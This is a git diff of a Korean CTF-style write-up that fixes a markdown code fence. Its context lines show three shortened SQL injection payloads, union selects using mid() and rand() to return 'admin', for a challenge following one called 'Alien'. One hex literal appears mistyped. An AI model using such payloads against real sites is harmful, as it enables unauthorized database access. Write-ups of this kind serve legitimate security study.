@@ -55,7 +55,7 @@ Alien을 풀 때 사용했던 페이로드를 최대한 줄여보자.
 Alien은 문제를 확실히 푸는게 중요했어서 time값과 sleep으로 50%의 확률로 문제를 풀 수 있게 했지만, 이번 문제는 페이로드를 짧게하는 것이 가장 중요한 목표이므로 rand를 사용한 접근을 해보았다.  
 또한 substr을 mid로 바꿨다.  
 
-``sql
+```sql
 ?no=0 union select mid(0x61646d696e,rand(),5)%23'union select mid(0x61646d696e,rand(),5)%23
 ?no=0 union select mid(@a:=0x61646d606e,rand(),5)%23'union select mid(@a,rand(),5)%23
 ?no=0 union select mid(@a:="admi" "n",rand(),5)%23'union select mid(@a,rand(),5)%23
